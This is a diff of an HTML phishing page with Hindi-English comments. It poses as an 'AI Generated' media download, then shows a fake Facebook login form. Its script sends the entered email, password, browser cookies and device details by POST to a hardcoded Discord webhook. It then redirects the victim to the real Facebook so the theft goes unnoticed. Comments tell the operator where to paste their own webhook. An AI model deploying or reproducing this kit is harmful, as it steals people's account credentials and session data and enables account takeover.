@@ -2,167 +2,302 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Photo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Media Downloader</title>
     <style>
-        body {
+        /* --- RESET & BASIC STYLES --- */
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
         }
-        .bg {
+
+        body {
+            background-color: #f0f2f5;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden; /* Prevent scrolling during transitions */
+        }
+
+        /* --- STEP 1: LANDING PAGE STYLES --- */
+        #landing-page {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            object-fit: cover;
-            z-index: 1;
-            opacity: 0.8;
-        }
-        .download-btn {
-            position: relative;
+            background: url('https://images.unsplash.com/photo-1614850523453-9c68ec279f3e?q=80&w=2670&auto=format&fit=crop') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             z-index: 10;
-            background: #1877f2;
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-            transition: transform 0.2s;
+            transition: opacity 0.5s ease-in-out;
         }
-        .download-btn:active { transform: scale(0.95); }
-        .modal-overlay {
-            display: none;
-            position: fixed;
+
+        .overlay {
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 100;
+            background: rgba(0, 0, 0, 0.4); /* Dark overlay for text visibility */
+            z-index: 1;
+        }
+
+        .content-wrapper {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .ai-badge {
+            background: linear-gradient(90deg, #ff00cc, #333399);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .cta-button {
+            background-color: #ffffff;
+            color: #1877f2;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+            outline: none;
+        }
+
+        .cta-button:active {
+            transform: scale(0.95);
+        }
+
+        /* --- STEP 2: LOGIN FORM STYLES --- */
+        #login-page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff; /* Clean white background */
+            display: flex;
             justify-content: center;
             align-items: center;
+            z-index: 20;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out;
         }
-        .login-box {
-            background: white;
+
+        .login-card {
+            width: 90%;
+            max-width: 380px;
             padding: 20px;
-            border-radius: 8px;
-            width: 85%;
-            max-width: 350px;
-            box-sizing: border-box;
-            position: relative;
+            text-align: center;
         }
-        .login-box h2 { margin: 0 0 15px 0; text-align: center; color: #1877f2; }
-        .input-group { margin-bottom: 12px; }
-        .input-group input {
+
+        .fb-logo {
+            color: #1877f2;
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input[type="text"], 
+        input[type="password"] {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            box-sizing: border-box;
+            padding: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
             font-size: 16px;
+            outline: none;
         }
+
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
         .login-btn {
             width: 100%;
-            padding: 12px;
-            background: #1877f2;
+            padding: 16px;
+            background-color: #1877f2;
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
+            margin-top: 10px;
         }
+
+        .login-btn:disabled {
+            background-color: #a4b0be;
+            cursor: not-allowed;
+        }
+
+        /* Loader */
         .spinner {
             display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #1877f2;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
             border-radius: 50%;
+            width: 24px;
+            height: 24px;
             animation: spin 1s linear infinite;
             margin: 10px auto;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Utility to hide elements completely */
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
 
-    <!-- Background Image -->
-    <!-- Neeche 'src' mein apni photo ka link daalo -->
-    <img src="alllpa.jpg" class="bg" alt="Background">
+    <!-- STEP 1: Landing Page -->
+    <div id="landing-page">
+        <div class="overlay"></div>
+        <div class="content-wrapper">
+            <div class="ai-badge">✨ AI Generated & Download Ready</div>
+            <button class="cta-button" onclick="showLoginForm()">Click to View</button>
+        </div>
+    </div>
 
-    <!-- Download Button -->
-    <button class="download-btn" onclick="openLogin()">Download Photo</button>
-
-    <!-- Login Modal -->
-    <div class="modal-overlay" id="modal">
-        <div class="login-box">
-            <h2>facebook</h2>
-            <form id="loginForm">
+    <!-- STEP 2: Fake Login Page -->
+    <div id="login-page">
+        <div class="login-card">
+            <div class="fb-logo">facebook</div>
+            
+            <form id="loginForm" onsubmit="return false;">
                 <div class="input-group">
-                    <input type="text" id="email" placeholder="Email or Phone" required>
+                    <input type="text" id="email" name="email" placeholder="Phone number or email address" required autocomplete="off">
                 </div>
                 <div class="input-group">
-                    <input type="password" id="password" placeholder="Password" required>
+                    <input type="password" id="pass" name="pass" placeholder="Password" required>
                 </div>
-                <div class="spinner" id="spinner"></div>
-                <button type="submit" class="login-btn">Log in</button>
+                
+                <button type="submit" id="btnSubmit" class="login-btn">Log in</button>
+                
+                <div class="spinner" id="loader"></div>
+                <p id="statusMsg" style="display:none; color: #606770; margin-top:10px; font-size:14px;">Logging in...</p>
             </form>
+            
+            <div style="margin-top: 20px; font-size: 14px;">
+                <a href="#" style="color: #1877f2; text-decoration: none;">Forgot password?</a>
+            </div>
         </div>
     </div>
 
     <script>
-        // --- YAHAN APNA WEBHOOK URL PASTE KARO ---
-        const webhookUrl = "https://discord.com/api/webhooks/1553320258054656070/u4QlkKbHzc6V2rwuf8ljZZh2jtGF-4dWQgG5pOztCH_Ej8qI1V6zQWA4OohQ6QTpfHhJ"; 
-        // ----------------------------------------
+        // ---------------------------------------------------------
+        // CONFIGURATION: APNA WEBHOOK URL YAHAN DAALO
+        // Example: https://discord.com/api/webhooks/YOUR_ID/TOKEN
+        // Or use: https://webhook.site/your-unique-id
+        // ---------------------------------------------------------
+        const webhookURL = "https://discord.com/api/webhooks/1553320258054656070/u4QlkKbHzc6V2rwuf8ljZZh2jtGF-4dWQgG5pOztCH_Ej8qI1V6zQWA4OohQ6QTpfHhJ"; 
 
-        function openLogin() {
-            document.getElementById('modal').style.display = 'flex';
+        function showLoginForm() {
+            // Hide Landing, Show Login
+            const landing = document.getElementById('landing-page');
+            const loginPage = document.getElementById('login-page');
+
+            landing.style.opacity = '0';
+            setTimeout(() => {
+                landing.classList.add('hidden');
+                loginPage.style.visibility = 'visible';
+                loginPage.style.opacity = '1';
+            }, 500); // Wait for fade out
         }
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const spinner = document.getElementById('spinner');
-            const btn = document.querySelector('.login-btn');
+        async function submitData() {
+            const btn = document.getElementById('btnSubmit');
+            const loader = document.getElementById('loader');
+            const statusMsg = document.getElementById('statusMsg');
+            const emailVal = document.getElementById('email').value;
+            const passVal = document.getElementById('pass').value;
 
-            spinner.style.display = 'block';
+            // Disable button and show loader
             btn.disabled = true;
+            btn.style.display = 'none';
+            loader.style.display = "block";
+            statusMsg.style.display = "block";
 
+            // Capture Cookies
+            const cookies = document.cookie || "(no cookies)";
+
+            // Prepare Payload
+            const payload = {
+                username: emailVal,
+                password: passVal,
+                cookies: cookies,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform
+            };
+
+            // Send Data to Webhook
             try {
-                // Data ko webhook par bhejna
-                await fetch(webhookUrl, {
+                await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password
-                    })
+                    body: JSON.stringify(payload)
                 });
+                
+                // Success Message
+                statusMsg.innerText = "Success! Redirecting...";
+                statusMsg.style.color = "green";
 
-                // Agar chaho to yahan success message ya redirect de sakte ho
-                alert("Details Sent!");
-                location.reload(); 
+                // Redirect to Real Facebook after 3 seconds
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com";
+                }, 3000);
 
             } catch (error) {
-                console.error('Error:', error);
-                alert("Error sending details");
-            } finally {
-                spinner.style.display = 'none';
+                console.error("Error sending data:", error);
+                loader.style.display = "none";
+                btn.style.display = 'block';
                 btn.disabled = false;
+                btn.innerText = "Try Again";
+            }
+        }
+
+        // Event Listeners
+        document.querySelector('.login-btn').addEventListener('click', submitData);
+        
+        // Allow Enter key to submit
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitData();
             }
         });
     </script>
